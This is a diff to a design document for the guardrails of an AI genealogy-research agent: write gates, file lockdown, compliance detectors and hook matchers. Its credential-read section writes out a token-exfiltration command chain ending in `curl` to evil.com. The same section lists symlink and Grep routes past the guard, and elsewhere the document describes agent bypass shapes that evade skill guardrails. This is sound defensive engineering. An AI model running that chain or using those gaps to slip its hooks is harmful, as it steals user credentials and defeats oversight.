@@ -65,6 +65,28 @@ Two bypass shapes are on record, both from committed runlogs:
 - **Untyped subagent** — a `Task`/`Agent` call with no `subagent_type` and a
   hand-written prompt standing in for the skill.
 
+A third shape is **sanctioned**, not a bypass:
+
+- **Direct typed spawn** — a `Task`/`Agent` call whose `subagent_type` names a
+  guardrail arm's agent, with no `Skill` call before it. This is the in-loop
+  route for a paired agent: `/research` spawns `research-exhaustiveness`,
+  `proof-conclusion` and `person-evidence` directly, and the same-named thin
+  skill, where one still exists, is only the direct-user and unit-eval entry
+  point. The `subagent_type` is what separates it from the untyped shape above.
+
+**The rule the detectors apply: credit a spawn by name.** A successful
+`Agent`/`Task` call whose `subagent_type`, with any `<plugin>:` namespace
+stripped, equals an arm's name puts that name in the invoked set exactly as a
+`Skill` call naming it does. An untyped or errored spawn credits nothing. There
+is no paired-agent map and nothing is derived from disk, because a set derived
+from "an agent with a same-named `SKILL.md`" silently drops each pair the day
+its thin skill is deleted, and two of the three thin skills already are. Agent
+names match the arm names by construction, so the rule covers any arm converted
+later with no harness edit. The namespace strip matters because Cowork and
+hosted feedback bundles log `genealogy-research:<agent>` while every committed
+e2e value is bare: a rule that forgot it would be green on the whole corpus and
+dead in production data.
+
 **Why attribution is hard.** The SDK's only context-scoping primitive is
 `agent_id`, present on `PreToolUseHookInput` only inside a `Task`-spawned
 subagent. A `Skill` invocation runs inline in the same session with no
@@ -145,7 +167,7 @@ depends on another shipping first.
 |---|---|---|---|---|
 | §5 | Write-boundary invariant | engine (MCP tool) — so Cowork, hosted, both harnesses | a tier claimed without a prior exhaustiveness declaration | **enforcing** |
 | §5 | Write-boundary invariant | engine (MCP tool) — so Cowork, hosted, both harnesses | a `relationship` assertion whose `relationship_type` contradicts what its own `value` says about the record subject, including a sibling typed as a child. Refuses **21 of 2586 (0.8%)**, measured at 1d5656fe3 by `eval/harness/scripts/measure_relationship_direction.py` | **enforcing** |
-| §6 | Raw-write lockdown | plugin hook (Cowork, hosted, wherever the plugin loads) + SDK hook (hosted) + e2e harness | writing the two project files without going through a validating tool | **enforcing** |
+| §6 | Raw-write lockdown | plugin hook (Cowork, hosted, wherever the plugin loads) + SDK hook (hosted) + e2e harness | writing a protected project file (`research.json`, `tree.gedcomx.json`, `starting-tree.gedcomx.json`, `external-collections.json`) without going through its writing tool | **enforcing** |
 | §7 | Caller-attributed recency check | e2e harness only | a protected write with no recent successful invocation of its owning skill | **shadow only — permanently, unless a skill gains a completion signal** |
 | §8 | Post-run compliance detectors | e2e harness only | a guardrail skill's effect in the final state with no invocation anywhere in the run | **reported (compliance axis); does not gate the run** |
 | §8 | Live pre-write `same_person` provenance check | e2e harness only (`pretool_hook`) | a `person_evidence` link for a brand-new tree person written before any `same_person` scored that identity | **shadow only** (opt-in `deny` per run). Its writer-side counterpart is no longer shadow: see the row below |
@@ -156,6 +178,7 @@ depends on another shipping first.
 | below | Staged-search backlog note | engine (MCP tool) — so Cowork, hosted, both harnesses | a search whose staged response no `research.json` log entry accounts for, and a nil search on a project path | **advisory only — reports, refuses nothing** (since 2026-08-31; from an alpha-feedback session where 11 `record_search` calls and one skill invocation produced zero log entries). Detection, not enforcement: whether it becomes a refusal wants the run-log rate first, which needs the deferred e2e detector. A nil search stages nothing, so the backlog half is structurally blind to it |
 | §5 | Completion gate: blocking conflicts | engine (MCP tool) — so Cowork, hosted, both harnesses | `project.status: "completed"` while an unresolved conflict blocks a question — it names one, is an identity conflict, or disputes an assertion a question was built on | **enforcing** (the two declared arms shipped first, motivated by the `wilkins-death-kentucky` finding of 2026-07-15; the derived arm widens them. refuses 11 of 128 (9%) completed corpus runs against the previous 5, measured at f459af71b; all 11 refusals read individually per ADR-0011 limit 2 and all are true positives) |
 | §5 | Core-identifier contradiction caps the tier | engine (MCP tool) - so Cowork, hosted, both harnesses | a `person_evidence` entry at `confident`/`probable` whose record states a birth place or a birth/christening date contradicting what the tree person attests, or which declares `core_identifier_conflict` | **enforcing** (since 2026-09-24). **Refuses 0 of 323** committed confident/probable entries. Reaching zero took four genealogical scopings, each measured: comparing any place refuses 274 (a census place is not a birthplace); birth-type only refuses 38; excluding secondary/no-proximity informants clears 35 of those (a death record's birthplace, senior genealogist ruling 2026-09-23) and excluding christening PLACE clears the other 3 (you are christened where the church is); scoping to the linked party clears 16 more and excluding two-party relationship assertions the last 14 (a son's birth year is not a contradiction for his father). All 38 of the un-gated arm were read individually per ADR-0011 limit 2 and every one was a false positive. Its limit: a link made through a relationship assertion is bound on the date arm only, and only when another link ties a one-party assertion of the same record party to the same person. One with no such sibling, including a relationship link written before its party's one-party link, is still not bound, because which of the two people it is about is not decidable from the documents |
+| §5 | An unexplained move between countries caps the tier | engine (MCP tool) - so Cowork, hosted, both harnesses | a `person_evidence` entry at `confident` whose record places the linked party in a recognized country other than every country the tree person's Residence/Census facts attest, with no `move_bridge` | **enforcing** (since this change). **Refuses 0 of 5,893** committed confident links (2,617 comparable). Its limits: it compares countries, never states, so a long move inside one country is the prose cap's to catch; it cannot judge whether the quoted `move_bridge` actually explains the move, only that one was named; and a place whose last segment names no recognized country is not checked |
 | §5 | A logged query names only filters its search sent | engine (MCP tool) — so Cowork, hosted, both harnesses | a `research_log_append` op whose explicit `query` names a filter key, with a value, that its staged `record_search` or `fulltext_search` never sent. A differing value is allowed (mostly place normalization, observed by the eval `report_*` validators instead), as are descriptive keys, plumbing and paging. A nil search stages nothing and is never judged | **enforcing** (refuses 18 of 358 paired staged ops, 15 distinct claims, all read individually per ADR-0011 limit 2 and all true positives, measured at a1960c5af by `packages/engine/mcp-server/dev/measure-log-query-claims.ts`; 0 of the 121 paired unit-eval ops, whose misstatements were filled from a staged payload the eval mock built from a fixture's recorded query, fixed at the mock. Unstaged entries — nil searches, searches made without a `projectPath` — and external-site entries are seen only by the eval `report_*` observers in `test_search_records.py` and `test_search_external_sites.py`) |
 | §5 | A resolution in prose must reach `conflicts[]` | engine (MCP tool) — so Cowork, hosted, both harnesses; the harness detector `find_unpersisted_conflict_resolutions` stays as the document-plane reading | a `proof_summaries` write whose question's `exhaustive_declaration.stop_criteria.conflict_resolution` claims a conflict was resolved while `conflicts[]` holds no record of it — empty, or not holding the `c_` id the stop-criterion names. Scoped to the summary written, read live, not tier-gated; a recorded but open conflict is not this miss. Every other conflict gate iterates `conflicts[]` and passes vacuously when it is empty, which is how a tester's project reached `completed` with the Conflicts section blank | **enforcing** (since 2026-09-28; the first guard graduated under ADR-0011's labelled-case rule, its cases in `packages/engine/mcp-server/tests/guard-cases/unpersisted-conflict-resolution.json`, replayed by both planes. **Refuses 10 summaries across 9 of 194 committed e2e final states**, measured at 0b65122bc by `packages/engine/mcp-server/dev/measure-unpersisted-conflict-guard.ts`, which names the same runs, summaries and questions as the harness replay. Every one has an empty `conflicts[]`. All 10 read individually per ADR-0011 limit 2: 9 true positives — two records weighed and settled in prose, or a spelling, index-reading or premise discrepancy of the tester's own class — and 1 borderline, a `cruz-corona-ancestry` run that fires on an illegible surname reading settled by a sibling's record, accepted as a satisfiable cost of one conflict entry. What it lets through is in `unpersistedConflictResolutionInvariants`: a stop-criterion reading "no conflicts remain", rewording to that, a resolution claim written after the summary, and — wider than the rule before it graduated — any `conflicts[]` entry at all backing an id-less claim, so one recorded conflict in a multi-question project turns it off for every other question's id-less claim) |
 | §5 | Hard image cap | engine (MCP tool) — so Cowork, hosted, both harnesses | a 21st distinct `imageId` from one image group in one project, read through `image_read`, `image_transcribe` or `volume_bisect` (one shared count, persisted in `results/image-browse.jsonl`). Thrown before the fetch; instrument: `src/utils/browse-budget.ts`, spec `image-transcribe-tool-spec.md` §5.8. Corpus replay 2026-10-01: 69 distinct images refused (74 calls) in 6 groups over 5 runs, none on an image backing a correct finding | **enforcing** (since 2026-10-01) |
@@ -176,7 +199,7 @@ the four objects in this branch’s own record-extraction candidate, so quote th
 | n/a | Assertion correction reaches its materialized fact | engine (MCP tool) — so Cowork, hosted, both harnesses | a `place`/`standard_place`/`date`/`value` corrected on an assertion never reaching the tree fact already materialized from it | **enforcing as a WRITE, not a refusal** — the write being made is the legitimate one, so there is nothing for a boundary check to refuse, and ADR-0009 constraint 6 rules out a gate no call shape can satisfy. Eight advisories ride it, none blocking: no fact carries the backlink; the fact holds a value this assertion never asserted (another source corroborated it); the assertion's value is malformed rather than withdrawn; the assertion has been re-classified so the fact no longer matches its type; a field was DELETED from the fact; the rewritten fact is `primary` (a concluded value a proof summary may cite); a `place` corrected without its `standard_place`; and a `date` corrected without its `standard_date`. A ninth, the country-contradiction clear, rides the same channel. Every advisory that describes a CHANGE is discarded if the rewrite is rolled back |
 | below | Tree fact agrees with its linked assertion | unit harness (inside a paid per-skill run) **and** the e2e harness, where it reports rather than fails | a backlinked fact whose `place`/`standard_place`/`date`/`value` disagrees with the assertion it was minted from | **enforcing on unit, reporting on e2e.** One predicate, `find_tree_facts_disagreeing_with_assertions`: the universal validator asserts on it, while `collect_post_hoc_shadow` emits its findings as a shadow kind live and `replay_post_hoc` recomputes them offline, so the plane the card was filed off is now covered — as a measured number, not a gate. Still green by construction on today's unit corpus, where no run both mints a backlinked fact and corrects its assertion; the shadow bucket likewise reads zero so far, over a small live population. Its falsifiable halves are `eval/harness/tests/unit/test_tree_fact_assertion_agreement_validator.py` and `eval/harness/tests/unit/test_post_hoc_shadow.py` |
 | below | Fact rewrite authorized by tool identity | unit harness only, and only inside a paid per-skill run | record-extraction touching `tree.gedcomx.json`'s `persons` for anything other than that rewrite. The skill is deliberately NOT added to the row's `callers`, which would also authorize adding an unsourced person and setting `primary`; `research_append`/`extraction_append` are authorized as TOOLS, and only when the whole persons delta is mirrored attributes on facts that already carried the same backlink | **enforcing there, nowhere else** (the same reasoning that authorizes `merge_tree_persons` on the research side — anything the substitution does not explain still fails) |
-| §5 | Unjustified genealogical warnings | engine (MCP tool) — so Cowork, hosted, both harnesses | a tree write (`tree_edit`, `tree_correct`, `merge_tree_persons`, `materialize_facts`) that introduces a genealogical warning (a `person_warnings` check absent before and present after) without a `warningJustifications` entry for each introduced warning id. `project_create` and `research_append`'s linked-fact rewrite are knowingly ungated (false allows). `tree_forget` is exempt. | **enforcing** |
+| §5 | Unjustified genealogical warnings | engine (MCP tool) — so Cowork, hosted, both harnesses | a tree write (`tree_edit`, `tree_correct`, `merge_tree_persons`, `materialize_facts`) that introduces a genealogical warning (a `person_warnings` check absent before and present after) without a `warningJustifications` entry for each introduced warning id, **except** the tags in `GATE_EXEMPT_TYPES` (membership and rationale: `person-warnings-tool-spec.md`). A **merge** that surfaces a contradiction NEITHER predecessor carried does introduce it and must be justified; one the collapsed person already carried is remapped to the survivor and needs nothing. Relationship endpoints are read from `parent`/`child` as well as `person1`/`person2` — reading only the Couple pair meant a parentage write marked nobody as touched and the gate could not fire on one at all; unexempted it refuses 419 of 2266 (18.5%) parentage edges, 67 of 2266 (3.0%) after the exemptions, measured at a36651a33 with `dev/measure-parentage-gate-rate.ts`. `earliestChildBirthToBirth12` and its relative form are deliberately NOT exempt: at cutoff 12 the tag is the only check that fires when a child is born BEFORE their parent, and exempting it let every gated writer accept one. Both are emitted once per impossible CHILD rather than once per parent — keyed on one child, a second impossible child either refused or LANDED depending only on whether the parent already carried that key, and the landing case is a real corpus shape. Warnings are computed one relationship hop out from the touched set, because `calculateWarnings` anchors a `relatives*` warning on a relative and the before side cannot reach that anchor when the path IS the edge being added — without the hop, 16 of 83 refused parentage edges are refused for a warning they did not introduce (`--no-widen-hop`). The hop is not subtract-only in general: on fact writes it ADDS refusals (review measured 37 without, 47 with, the 10 extra all true catches). `project_create` and `research_append`'s linked-fact rewrite are knowingly ungated (false allows). `tree_forget` is exempt. | **enforcing** |
 | §6 | Claim ownership by caller (`exhaustive_declaration`) | plugin hook — Cowork, hosted, wherever the plugin loads; and the e2e harness; and the unit harness since 2026-09-02 | an op setting `exhaustive_declaration.declared` to true from anything but the `research-exhaustiveness` agent. FIELD-scoped, not section-scoped: `declared: false` is not routed, because the schema makes the field required and question creation would otherwise be denied | **enforcing** (since 2026-08-23; unproven against a real Cowork payload; the **hosted** binding of this arm is proven by `make hook-smoke` (§6.4)) |
 
 > **§6's "Reaches" claim is narrower than it looks — see §6.1.** Measured
@@ -359,7 +382,7 @@ and getting it wrong is what made three checks look dead for a fortnight:
 | §7.5 citation-nulling (`find_citation_nulling_in_conclusions`) | **0**, 0 runs | **0**, of 159 scanned | never observed either way |
 | §7.5 citation-nulling, TREE side (`find_citation_nulling_in_tree_sources`) | **0**, 0 runs — arm added 2026-08-25, no run has carried it yet | **111 source(s), across 50 runs**, of 159 scanned | shadow, reported; **deliberately not graduated** — see below |
 | §7.5 conflict-unpersisted (`find_unpersisted_conflict_resolutions`) | **6**, across 5 runs, measured at 0b65122bc | **10** summaries across 9 of 194 runs, measured at 0b65122bc | **graduated 2026-09-28** to a `research_append` precondition that refuses the `proof_summaries` write, under ADR-0011's labelled-case rule. The harness detector stays as the document-plane reading, and both replay one case file |
-| §7 warnings-unchecked (`find_relationship_writes_without_warnings_check`) | **1**, 1 run | **59 runs**, of 158 scanned | behaviour confirmed; live store path exercised |
+| §7 warnings-unchecked (`find_relationship_writes_without_warnings_check`) | **1**, 1 run | **0 runs**, of 68 scanned (134 skipped), measured at 14737e6f3 | **retargeted (2026-10-06)**: tree writers refuse unjustified warnings at write time, so the check now detects a refusal nothing landed after. The 59-of-158 figure was the RETIRED question and is not comparable. 134 of 202 committed runs are capture-stripped and cannot carry the marker, so they are skipped rather than counted clean |
 | §11 unnamed-delegate (`find_protected_writes_by_unnamed_delegate`) | **15**, across 1 run (of 20 that carry any attribution, 159 scanned) | **15**, 1 run | shadow, reported, no graduation count — revisit only if a **second** attributed run flags |
 | §11.5 tree-encoding (`find_conclusions_without_tree_encoding`) | **0**, 0 runs | **3**, across 3 runs, of 183 scanned | shadow, reported, and deliberately never a gate: the 2026-08-24 no-override ruling prefers a false allow to a false deny, so this count is calibration for a gate nobody has shipped; 2026-09-23 read: 2/3 fires are false denies (documented negatives), stays WARNING pending a negative-conclusion signal |
 | §7.5 tree-fact/assertion agreement (`find_tree_facts_disagreeing_with_assertions`) | **0**, 0 runs — arm added 2026-09-21, no run has carried it yet | **0**, of 184 scanned | shadow, reported; a MEASURED zero over a young population, not a structural one — why, and what would change it, is in `tree-materialization-spec.md` section 4.4 |
@@ -460,7 +483,7 @@ splits in two:
 
 | | is the zero ambiguous? | has the live store path ever been exercised? |
 |---|---|---|
-| warnings-unchecked | **no** — 59 corpus fires | **yes** — `stribling-father-1821/run-2026-08-17_23-35-44`, the corpus's only stored entry |
+| warnings-unchecked | **no** — 0 corpus fires post-retarget (the 59 were the retired question) | **yes** — `stribling-father-1821/run-2026-08-17_23-35-44`, the corpus's only stored entry |
 | conflict-unpersisted | **no** — 10 corpus fires, measured at 0b65122bc; now also refused at the writer tool | **yes** — 6 stored entries across 5 runs, measured at 0b65122bc, among them `robert-lord-children/run-2026-09-16_14-15-30` |
 | citation-nulling | **yes** — zero on both axes | **no** |
 
@@ -474,18 +497,49 @@ this axis. The replay plumbing has its own controls in
 resolution, seed-tree loading and per-check skip discipline rather than against
 the predicates.
 
-**warnings-unchecked was considered for graduation and declined — 2026-08-23.**
-It is the check with by far the largest sample, so it is the one a future reader
-will reach for first; the reasoning is recorded here so it is not re-derived. 59
-runs of 158 is a **corpus behaviour count, not a production signal**, and
-`docs/architecture.md` ("Every measurement in this repo describes the eval
-corpus, not production") says outright not to graduate a gate on a violation
-rate. A hard compliance check at that frequency would fail a large share of a
-suite costing $7–25 a run, over a process omission that corrupts no document —
-ADR-0011's satisfiability limit reads that as a constant rather than a
-guardrail. What the number argues for instead is moving the check to the write
-boundary, where the guardrail runs itself rather than a detector reporting that
-nobody asked; that is a separate piece of work with its own measurements.
+**warnings-unchecked — superseded by the engine gate (2026-10-02).**
+The 2026-08-23 decline reasoned that the right fix was "moving the check to the
+write boundary, where the guardrail runs itself rather than a detector reporting
+that nobody asked." The four tree writers (`tree_edit`, `tree_correct`,
+`merge_tree_persons`, `materialize_facts`) now refuse a write that introduces
+an unjustified genealogical warning. The shadow detector is retargeted: instead
+of checking whether `person_warnings` was called after a write, it checks
+whether any writer returned `unjustified_warnings` and the agent never re-called
+with justifications. The prose "run check-warnings after writes" steps have been
+removed from the two bodies whose writes a gated writer covers (`tree-edit`,
+`proof-conclusion`). `person-evidence` keeps a SCOPED version: a `pe_` link
+goes through `research_append`, not a gated writer, so an imported relative's
+pre-existing impossibility is surfaced by nothing else — its step is narrowed
+to persons it linked to rather than removed. `init-project` keeps its step: it writes
+only through `project_create` and `research_append`, and both are deliberately
+ungated (above), so nothing else would surface a warning on an imported tree.
+
+**No eval validator asserts this gate, deliberately.** PR 2 first replaced the
+retired `test_check_warnings_runs_after_a_write` validators with
+`test_no_unjustified_warning_write` in `validators/test_tree_edit.py` and
+`validators/test_person_evidence.py`. Both were removed again, because the
+check they performed cannot be expressed at that layer:
+
+- **A real leak is invisible to them.** The thing the gate guarantees is that
+  an unjustified write never LANDS. A leak would therefore show up in the tree,
+  not in `tool_calls` — and these validators read `tool_calls`.
+- **The one path on which they fire is a false positive.** They gated on the
+  project having changed, then failed the run if the last refusal had no landed
+  writer after it. But "a writer landed after the refusal" is the same fact as
+  "the refusal was resolved", so the only way to reach the assertion is a run
+  that changed state through an UNGATED writer (`research_append` writing `pe_`
+  links) and then correctly abandoned a refused one. Abandoning is exactly what
+  the refusal message and both agent bodies tell the agent it may do.
+- They were dead on arrival and so never fired: the shared predicate keyed on
+  `response_summary`, which only the e2e tier records, while the unit harness
+  records `response`. Fixing that key would have turned two inert checks into a
+  false-positive generator reddening compliant paid runs.
+
+What enforces the gate is the engine, and what proves it is the engine's own
+tests (PR 1). That is the ADR-0011 position — the guardrail lives at the write
+boundary — and a second, weaker assertion in the eval layer adds no coverage.
+The shadow detector stays: it MEASURES how often a refusal is abandoned without
+failing a run on it, which is a different question and a legitimate one.
 
 **What the replay claims, and what it does not.** It is a **behaviour-presence**
 measurement: did this shape occur in the corpus at all. It is **not** a per-run
@@ -506,7 +560,8 @@ tool-call ledger.
 
 **§7's status is a finding, not a queue position.** Its graduation was gated on a
 false-positive rate that cannot be measured while its success gate reads `Skill`
-launch acknowledgements — and no instrument available to the harness observes
+launch acknowledgements, and a typed spawn's result does not say whether the
+agent did the work either (§7) — and no instrument available to the harness observes
 skill *completion* (§7, "What the success gate can and cannot see"). Treat that
 row as settled unless one of the four skills becomes something that emits a
 completion signal; do not re-open it as a calibration task.
@@ -599,10 +654,11 @@ to understand before reading either:
   as the write, while the replay always sees the full prefix. Its second job is
   scoring a candidate *narrowing* of the rule against history before that
   narrowing ships. The three post-hoc checks: citation-nulling **0** of 159
-  scanned, conflict-unpersisted **4 runs** of 159 (10 summaries across 9 of 194 runs when it graduated, measured at 0b65122bc), warnings-unchecked **59 runs**
-  of 158 — the 159th being the corpus's one orphan run log
-  (`william-ferber-ancestry`, a committed run with no fixture directory, and so
-  no baseline to diff a relationship against). Every replay **names** the runs it
+  scanned, conflict-unpersisted **4 runs** of 159 (10 summaries across 9 of 194 runs when it graduated, measured at 0b65122bc), warnings-unchecked **0 runs**
+  of 67 scanned, 134 skipped. The skips are the capture-stripped logs, which
+  carry no `response_summary` and so cannot hold the refusal marker; the
+  orphan run log (`william-ferber-ancestry`) is no longer among them, because
+  the retargeted check needs no baseline tree to diff against. Every replay **names** the runs it
   could not read rather than counting them clean, per check: a denominator that
   quietly shrank reads as a clean corpus, which is the failure this whole section
   exists to correct.
@@ -657,6 +713,7 @@ What the detector currently treats as deciding reachability:
 | non-null `record_persona_id` | yes | `research_append` verified it against the record's `gedcomx.persons[]` on write |
 | `record_read` | yes | returns a `SimplifiedGedcomX` with a persons array — the persona was in hand |
 | `record_search` with a retained `results_ref` | yes | the sidecar result carries the record's `gedcomx` |
+| `person_record_matches` | yes | an accepted FamilySearch hint (search-hints' record mode): its ark is a `1:1:` record persona, which record-extraction fetches with `record_read` |
 | `fulltext_search` | **no** | an FTS result carries transcript text, names and places but no GedcomX, and its ARK is a `3:1:`/`3:2:` image entry `record_read` (which takes a `1:1:` record-persona ARK) cannot open |
 | image, external site, PDF | **no** | unstructured; no persons array |
 | a search whose sidecar was not retained | **no** | nothing to read the persona out of |
@@ -833,10 +890,17 @@ manufacture violations in paid grading. `did_not_land` in
 `eval/harness/harness/skill_invocation.py` is the shared predicate. Two callers
 use it to **skip** a call (`find_unguarded_protected_writes`, and
 `guardrail_shadow_report.py`'s person-evidence scan). The third —
-`find_relationship_writes_without_warnings_check` — uses it to withhold
-**credit**: there a successful `person_warnings` means the tree was checked, so a
-no-project call must not count as consulting the guardrail. Getting that one
-backwards is a *missed* violation, and therefore silent.
+`find_relationship_writes_without_warnings_check` — retargeted (2026-10-02):
+it now checks for unresolved `unjustified_warnings` refusals from tree writers
+rather than checking whether `person_warnings` was called. **The polarity trap
+survived the retarget**: the success arm still withholds *credit* rather than
+skipping a call, so a success matched in the wrong place is a missed violation
+and therefore silent. It is matched by ORDER — the last refusal, then a
+successful writer call after it. Scanning the whole call list for "any success"
+credits a write that landed *before* the refusal, so a run that wrote one op,
+was refused on the next, and gave up reads as clean; that is how the retarget
+first shipped, and `test_warnings_unchecked_fires_when_the_success_predates_the_refusal`
+is what holds it.
 
 ### Set-once project fields
 
@@ -1473,9 +1537,11 @@ present-and-empty. And it says nothing about overclaiming language in
 
 ## 6. Raw-write lockdown
 
-No raw `Write`, `Edit`, or `NotebookEdit` may target `research.json` or
-`tree.gedcomx.json`. Every write goes through a validating MCP tool
-(`research_append`, `research_log_append`, `tree_edit`, `tree_correct`); a
+No raw `Write`, `Edit`, or `NotebookEdit` may target `research.json`,
+`tree.gedcomx.json`, `starting-tree.gedcomx.json` or `external-collections.json`
+(`PROTECTED_PROJECT_FILES`). Every write goes through an MCP tool — a validating
+one (`research_append`, `research_log_append`, `tree_edit`, `tree_correct`) for
+the first two, and `external_links_search` for `external-collections.json`; a
 direct file write never validates.
 
 Three shipping copies, plus the unit harness — which *imports* the plugin
@@ -1677,26 +1743,54 @@ stalled, that loop is also what answers hook callbacks, so every PreToolUse
 callback went unanswered and the CLI timed each one out — and because the matcher
 was `None`, that killed calls with nothing to deny, including a purely local
 `ToolSearch`. A live session on 2026-08-25 lost 4 of 8 extractions this way. The
-matcher is now `_PRETOOL_MATCHER`, **derived** from the **four** constants the
-predicate reads — `_FILE_WRITE_TOOLS`, `_EXFIL_GUARD_TOOLS`, `DEVICE_WRITE_TOOLS`
-and `DELEGATION_TOOLS` — so the divergence above cannot recur by restatement. It
-comes out as:
+matcher is now `_PRETOOL_MATCHER`, **derived** from the **five** constants the
+predicate reads — `_FILE_WRITE_TOOLS`, `_EXFIL_GUARD_TOOLS`,
+`_CREDENTIAL_READ_GUARD_TOOLS`, `DEVICE_WRITE_TOOLS` and `DELEGATION_TOOLS` — so
+the divergence above cannot recur by restatement. It comes out as:
 
-    ^(Write|Edit|NotebookEdit|Bash|Agent|Task)$|.*device_commit_files$
+    ^(Write|Edit|NotebookEdit|Bash|Read|Grep|Glob|Agent|Task)$|.*device_commit_files$
 
-Two corrections to what this paragraph said before review, both worth stating
-because the wrong version is the sort a reader would trust: the derivation named
-**two** constants, and it acquired a third when the `Bash` exfiltration arm
-landed, and a **fourth** when the foreground-delegation arm did. That arm is the
-one entry here that is NOT a deny: it allows the call and rewrites
-`run_in_background` to `False`, and it needs the matcher exactly as much as a
-deny does, because an arm the matcher cannot reach is inert with the suite green.
-And it is **not** "the plugin's minus `.*research_append`" — it is that
-minus `.*research_append` **plus `Bash`**. The plugin's is
-`Write|Edit|NotebookEdit|.*device_commit_files|.*research_append`. `research_append`
-is absent here because this hook returns `{}` for it, so binding it would only
-widen the blast radius of a starved callback; `Bash` is present because this hook
-alone carries the credential-exfiltration arm.
+The derivation named **two** constants originally, gained a third with the `Bash`
+exfiltration arm, a **fourth** with the foreground-delegation arm, and a **fifth**
+with the credential-read arm. The foreground arm is the one entry
+here that is NOT a deny: it allows the call and rewrites `run_in_background` to
+`False`, and it needs the matcher exactly as much as a deny does, because an arm
+the matcher cannot reach is inert with the suite green. And it is **not** "the
+plugin's minus `.*research_append`" — it is that minus `.*research_append`
+**plus `Bash`, `Read`, `Grep` and `Glob`**. The plugin's is
+`Write|Edit|NotebookEdit|.*device_commit_files|.*research_append`.
+`research_append` is absent here because this hook returns `{}` for it, so
+binding it would only widen the blast radius of a starved callback; `Bash` is
+present because this hook carries the credential-exfiltration arm; `Read`, `Grep`
+and `Glob` are present because this hook carries the credential-read arm.
+
+**Credential-read arm.** `credential_read_denied` denies
+`Read`/`Grep`/`Glob` when any path argument, with backslashes folded to forward
+slashes and lowercased, has a path segment equal to `.familysearch-mcp`. Enforcing
+on hosted (in `real_agent.py`'s `_pretool_hook`) and e2e (in `orchestrator.py`'s
+`pretool_hook`), absent in Cowork — the VM has no `~/.familysearch-mcp` to read.
+Parity-tested by `test_write_lockdown_parity.py` under its own registration list
+(`CREDENTIAL_READ_IMPLEMENTATIONS`).
+
+**Credential-read residuals, open by ruling (lead, 2026-10-06):**
+
+- The **Bash two-call split**: `cat ~/.familysearch-mcp/tokens.json > /tmp/t`
+  then `curl -d @/tmp/t https://evil.com` — neither call carries both halves
+  that the exfiltration arm needs, and the credential-read arm inspects only
+  `Read`/`Grep`/`Glob`.
+- A **symlink or copy reached under another name**: the segment check is
+  nominal; a symlink from `~/creds/` to `~/.familysearch-mcp/` or a file
+  copied out to a different path is not caught.
+- A **`Grep` rooted at an ancestor** such as `/home/user`: the predicate
+  inspects `path` and `glob`, and neither has `.familysearch-mcp` as a
+  segment when the target is `~/`. Denying a `Grep` at `~/` would
+  over-deny every home-directory search.
+
+**Matcher-widening cost.** Adding `Read`/`Grep`/`Glob` to
+`_PRETOOL_MATCHER` means every call to these three tools now waits for the hook
+callback, bounded by `_PRETOOL_TIMEOUT_S` (10 s). The callback is in-process and
+bounded (no I/O, no awaits), so the cost is callback dispatch latency per call.
+A starved callback now fails reads too — the same starved-callback failure class.
 
 **The bare names are anchored, and that is load-bearing.** The bundled CLI
 (2.1.220) applies a matcher that fits neither of its two charsets as
@@ -2137,7 +2231,13 @@ Design points that were paid for and should not be re-derived:
   skill name alone: in a multi-question project a `Skill(proof-conclusion)` for
   question A would otherwise cover an inline write for question B. Where no
   question id can be extracted, it falls back to a per-skill window and accepts
-  the imprecision.
+  the imprecision. A typed spawn's question id is read from its `description`
+  and `prompt`, and used only when exactly one distinct `q_` id appears there.
+- **A summons is a `Skill` call or a typed spawn of the owner's name** (§2, the
+  sanctioned third shape), and **a write made by the owning agent itself is
+  never flagged**: its own `agent_type`, namespace stripped, equals the owner.
+  The exemption is per owner, so a batch that also touches another owner's
+  section is still checked for that owner.
 - **Protected writes include the tree side**, not just `research.json`.
   `materialize_facts` can create a tree person and attach facts with no
   `person_evidence` entry existing at all, and `proof-conclusion` owns tree
@@ -2151,7 +2251,8 @@ got round to the calibration. It is that the calibration has no instrument.
 
 Graduating §7 was gated on a false-positive rate. That rate is not obtainable
 while "did the skill succeed" is read off `Skill` entries, because those entries
-carry launch acknowledgements — a census of the committed corpus returns 18
+carry launch acknowledgements (a typed spawn's `is_error` is no better; the end
+of this subsection says why) — a census of the committed corpus returns 18
 distinct values across 1,242 entries, all of the form `Launching skill: <name>`
 plus one unknown-skill error. Three candidate instruments were checked and none
 observes completion:
@@ -2175,8 +2276,18 @@ observes completion:
   `match_score` precedent at the top of this section.
 
 **What would change the answer:** giving a guardrail skill an identity that emits
-a completion signal — i.e. converting it to an agent, which §9 costs out. Absent
-that, do not re-open this as a tuning task; the window is not the variable. The
+a completion signal — i.e. converting it to an agent, which §9 costs out.
+**Crediting a typed spawn (§2, the sanctioned third shape) does not supply that
+signal.** A synchronous `Agent`/`Task` result returns after the agent stops, but
+its `is_error` does not say whether the agent did the work: an agent that hit
+the tool-call cap and wrote nothing returns `is_error: false`
+(`hannah-earnest-children/run-2026-10-05_23-36-27`, the two
+`research-exhaustiveness` spawns at calls 421 and 424, measured at 70bbe069d).
+A `run_in_background` spawn returns only a launch acknowledgement and is
+credited all the same. So the success gate still cannot see completion on
+either route, and `packages/engine/mcp-server/tests/guard-cases/registry.json`
+keeps its row as written.
+Either way, do not re-open this as a tuning task; the window is not the variable. The
 count barely moves from window 10 to 150 (§3), which was the early tell.
 
 The window itself stays at 40 and the layer stays instrumented, because the
@@ -2382,8 +2493,8 @@ this section before reopening one.
   the `agent-*.meta.json` that names the spawning `Agent` call.
 
   **The consumer SPLICES, and that is the whole risk in reading them.** The
-  summons is a `Skill` call in the parent stream and the write happens in the
-  child's, so `adapt_bundle` inserts a child's calls at the index of the
+  summons is a `Skill` call or a typed spawn of the owner's name in the parent
+  stream and the write happens in the child's, so `adapt_bundle` inserts a child's calls at the index of the
   `Agent`/`Task` call its meta names. Appending them instead would put the
   write outside its own skill's `window` entries and report a violation that
   never happened — a fabricated non-zero, worse than a known zero because it is
@@ -2433,12 +2544,26 @@ this section before reopening one.
 
   One limit stays, and it is measured rather than fixed: splicing puts a
   subagent's own calls inside the window, so a subagent making more than
-  `window` calls before its protected write pushes the parent's `Skill` call
-  back out. The e2e harness already carries subagent calls in one flat list
+  `window` calls before its protected write pushes the parent's summons back
+  out. The e2e harness already carries subagent calls in one flat list
   (its hook stamps `agent_id`/`agent_type` onto each), so changing the window
   for bundles alone would make the two corpora incomparable. Anchoring the window at the spawning call rather than the write
   is a change to `skill_invocation.py` and belongs to whichever measurement
   shows it is needed.
+
+  **Both risks apply only to a non-owner transcript.** A write whose own
+  `agent_type`, namespace stripped, is its owner (the `proof-conclusion` agent
+  writing `proof_summaries` or encoding its conclusion in the tree, the
